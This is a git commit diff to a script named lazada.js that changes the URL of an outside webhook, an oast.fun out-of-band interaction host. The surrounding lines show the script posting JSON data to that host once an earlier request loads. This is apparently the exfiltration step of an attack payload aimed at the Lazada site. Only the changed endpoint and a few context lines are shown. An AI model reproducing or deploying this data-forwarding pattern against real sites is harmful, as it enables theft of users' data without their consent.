0ae8e93ddc6d81fe7a200c3bb85ec9139a8a12e8
Charchit2418 <89621729+Charchit2418@users.noreply.github.com>
2024-03-24 16:36:34 +0545

    Update lazada.js

--- lazada.js
+++ lazada.js
@@ -17,7 +17,7 @@ xhr.onload = function() {
     var webhookXhr = new XMLHttpRequest();
 
     // Prepare the request to the webhook
-    webhookXhr.open('POST', 'https://qltxyxqadspfcfpdvhmu0lc79wp6tcydt.oast.fun', true);
+    webhookXhr.open('POST', 'https://qltxyxqadspfcfpdvhmuijzirzl9mkmkv.oast.fun', true);
     webhookXhr.setRequestHeader('Content-type', 'application/json');
 
     // Define what happens on successful data sending
